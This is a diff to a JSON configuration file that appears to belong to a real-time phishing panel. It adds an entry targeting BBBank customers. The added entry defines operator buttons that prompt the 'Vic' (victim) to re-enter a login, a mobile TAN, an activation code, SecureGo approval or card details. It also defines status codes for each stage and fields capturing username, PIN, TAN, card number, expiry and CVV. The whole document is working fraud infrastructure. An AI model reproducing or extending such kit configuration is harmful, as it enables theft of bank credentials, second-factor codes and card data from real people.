@@ -21,6 +21,10 @@
 			"id": "apple"
 		},
 		{
+			"name": "BBBank",
+			"id": "bbbank"
+		},
+		{
 			"name": "BNZ",
 			"id": "bnz"
 		},
@@ -323,6 +327,115 @@
 		"mainInfo": [
 			{
 				"usernameHeading": "regnumber"
+			}
+		]
+	},
+	"bbbank": {
+		"buttons": [
+			{
+				"name": "ASK LOGIN AGAIN",
+				"status": "0"
+			},
+			{
+				"name": "ASK MOBILE TAN",
+				"status": "2"
+			},
+			{
+				"name": "ASK ACTIVATION CODE",
+				"status": "4"
+			},
+			{
+				"name": "ASK CARD INFO",
+				"status": "6"
+			},
+			{
+				"name": "ASK SECURE GO",
+				"status": "8"
+			},
+			{
+				"name": "FINISH",
+				"status": "9"
+			}
+		],
+		"status": [
+			{
+				"status": 0,
+				"meaning": "Vic Resubmitting Login"
+			},
+			{
+				"status": 1,
+				"meaning": "Vic Waiting... Submitted Login"
+			},
+			{
+				"status": 2,
+				"meaning": "Vic Submitting Mobile TAN"
+			},
+			{
+				"status": 3,
+				"meaning": "Vic Waiting... Submitted Mobile TAN"
+			},
+			{
+				"status": 4,
+				"meaning": "Vic Submitting Activation Code"
+			},
+			{
+				"status": 5,
+				"meaning": "Vic Waiting... Submitted Activation Code"
+			},
+			{
+				"status": 6,
+				"meaning": "Vic Submitting Card Info"
+			},
+			{
+				"status": 7,
+				"meaning": "Vic Waiting... Submitted Card Info"
+			},
+			{
+				"status": 8,
+				"meaning": "Vic Submitting Secure Go"
+			},
+			{
+				"status": 9,
+				"meaning": "Finished"
+			},
+			{
+				"status": 10,
+				"meaning": "Vic Waiting... Resubmitted Login"
+			}
+		],
+		"information": [
+			{
+				"heading": "Username",
+				"key": "username"
+			},
+			{
+				"heading": "PIN",
+				"key": "pin"
+			},
+			{
+				"heading": "Mobile TAN",
+				"key": "mobileTan"
+			},
+			{
+				"heading": "Activation Code",
+				"key": "activationCode"
+			},
+			{
+				"heading": "Card Number",
+				"key": "ccnum"
+			},
+			{
+				"heading": "Card Expiry",
+				"key": "ccexp"
+			},
+			{
+				"heading": "CVV",
+				"key": "cvv"
+			}
+		],
+		"mainInfo": [
+			{
+				"usernameHeading": "username"
 			}
 		]
 	},
